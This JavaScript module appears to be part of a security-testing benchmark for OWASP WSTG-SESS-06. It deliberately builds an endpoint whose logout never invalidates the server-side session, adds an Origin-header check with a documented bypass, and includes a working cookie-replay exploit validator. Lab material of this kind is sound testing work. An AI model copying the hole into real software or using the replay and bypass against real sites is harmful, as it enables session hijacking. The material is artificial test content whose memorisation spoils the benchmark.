// WSTG-SESS-06 (4.6.6) — Logout Functionality behaviour.
//
// Stateless in-memory session map: sessionId -> active boolean. Signup
// inserts an active session. The logout endpoint sets the cookie to an
// expired Set-Cookie but never updates the server-side `active` flag.
// The privileged endpoint trusts the cookie if the session id exists in
// the map at all (active flag isn't checked — the canonical bug).
//
// At T1 a behavioural rule on the privileged endpoint demands the
// request's Origin header match the deploy host. The bypass is to send
// the captured cookie with the correct Origin header — trivial for an
// attacker who knows the deploy URL, which they do (they're talking to
// it).

import crypto from 'node:crypto'
import { Scenario } from './scenario.mjs'

const sessions = new Map()

function readSessionCookie(req, scenario) {
  const cookies = String(req.headers.cookie || '').split(';').map(c => c.trim())
  const target = cookies.find(c => c.startsWith(scenario.sessionCookieName + '='))
  return target ? target.slice(scenario.sessionCookieName.length + 1) : null
}

export const classDef = {
  wstgId: 'WSTG-SESS-06',
  class: 'Logout Functionality',
  defenceTiers: [0, 1],
  Scenario,
  supportsSignup: true,
  needsSignup: true,
  canaryRuntime: true,
  discoveryMode: 'observation',
  discoveryTargetPath: (s) => s.privilegedAreaPath,
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string' && s.chromeInjection.html.includes(s.privilegedAreaPath),

  async onSignup({ sessionId, rawScenario }) {
    const scenario = Scenario.parse(rawScenario)
    // The runtime's /signup sets a cookie named `session`; we proxy that
    // identifier into our own scenario-named cookie via the first GET to
    // the privileged area (see handleRequest). Insert an active record
    // keyed on the runtime sessionId so the server knows the user exists.
    sessions.set(sessionId, { active: true, scenario_cookie_seen: false })
    return {}
  },

  matchesRequest({ reqUrl, req, scenario }) {
    if (reqUrl.pathname === scenario.privilegedAreaPath && req.method === 'GET') return true
    if (reqUrl.pathname === scenario.logoutPath && (req.method === 'GET' || req.method === 'POST')) return true
    return false
  },

  async handleRequest({ req, reqUrl, scenario, session, renderPage, manifest }) {
    if (reqUrl.pathname === scenario.logoutPath) {
      // The bug: the cookie is cleared client-side, but the server-side
      // session record stays active forever. A defended app would set
      // sessions.get(session).active = false here. We do not.
      const headers = {
        'Set-Cookie': `${scenario.sessionCookieName}=; Path=/; Max-Age=0`,
      }
      return {
        status: 302,
        headers: { ...headers, Location: '/' },
        body: '',
      }
    }

    // Privileged area.
    // Two cookies in play: the runtime's `session` (set by /signup) and
    // our own scenario-named cookie. On the first authenticated GET we
    // mint a fresh scenario cookie carrying a server-generated session
    // id; subsequent requests are gated only on that id existing in the
    // map.
    const scenarioCookie = readSessionCookie(req, scenario)
    let sid = scenarioCookie
    let mintedThisRequest = false
    if (!sid && session && sessions.has(session)) {
      sid = 'sid_' + crypto.randomBytes(12).toString('hex')
      sessions.set(sid, { active: true })
      mintedThisRequest = true
    }
    if (!sid || !sessions.has(sid)) {
      return { status: 302, headers: { Location: '/signup' }, body: '' }
    }

    // T1 behavioural rule (encoded here because the generic regex WAF
    // cannot express cross-surface conditionals): when the request
    // carries the scenario cookie, the Origin header must match the
    // deploy host. A bare cookie replay with no Origin trips this.
    const tier = manifest.defenceTier || 0
    if (tier >= 1 && scenarioCookie) {
      const origin = String(req.headers.origin || '')
      const host = String(req.headers.host || '')
      if (origin !== `http://${host}` && origin !== `https://${host}`) {
        return {
          status: 403,
          body: renderPage('<section style="max-width:520px;margin:48px auto;text-align:center"><h1>Request blocked</h1><p>Origin verification failed.</p></section>'),
        }
      }
    }

    const headers = { 'Content-Type': 'text/html; charset=utf-8' }
    if (mintedThisRequest) {
      headers['Set-Cookie'] = `${scenario.sessionCookieName}=${sid}; Path=/; HttpOnly; SameSite=Lax`
    }
    return {
      status: 200,
      headers,
      body: renderPage(scenario.privilegedAreaBody.replaceAll('{CANARY}', manifest.perDeployCanary)),
    }
  },

  // Validator: sign up, visit privileged area (mints scenario cookie,
  // returns canary the first time), hit logout (which clears cookie
  // client-side but leaves session active), replay the captured cookie
  // against the privileged endpoint, recover canary again.
  //
  // Payload distinguishes T0 canonical / T1 bypass:
  //   replay-cookie-no-origin  -> replay without Origin (canonical;
  //                               blocked by T1 behavioural rule)
  //   replay-cookie-with-origin -> replay with the deploy's Origin header
  //                               set (T1 bypass)
  async fireExploit({ baseUrl, scenario, payload, helpers }) {
    const runtimeCookie = await helpers.signup({ email: 'tester@example.test' })
    if (!runtimeCookie) return { status: 0, body: '(signup failed)' }
    // First visit mints the scenario cookie. Capture it.
    const firstResp = await fetch(`${baseUrl}${scenario.privilegedAreaPath}`, {
      headers: { Cookie: runtimeCookie, Origin: baseUrl },
    })
    const setCookie = firstResp.headers.get('set-cookie') || ''
    const m = setCookie.match(new RegExp(`${scenario.sessionCookieName}=([^;]+)`))
    if (!m) return { status: firstResp.status, body: '(scenario cookie not minted)' }
    const capturedCookie = `${scenario.sessionCookieName}=${m[1]}`
    // Hit logout to clear the cookie client-side. The server-side session
    // stays active (the bug).
    await fetch(`${baseUrl}${scenario.logoutPath}`, {
      headers: { Cookie: capturedCookie, Origin: baseUrl },
      redirect: 'manual',
    })
    // Replay the captured cookie. With Origin set, the T1 behavioural
    // rule lets the request through; without Origin, T1 blocks but T0
    // succeeds (no WAF).
    const replayHeaders = { Cookie: capturedCookie }
    if (payload === 'replay-cookie-with-origin') {
      replayHeaders.Origin = baseUrl
    }
    const r = await fetch(`${baseUrl}${scenario.privilegedAreaPath}`, { headers: replayHeaders })
    return { status: r.status, body: await r.text() }
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    responseBody.includes(perDeployCanary),
}
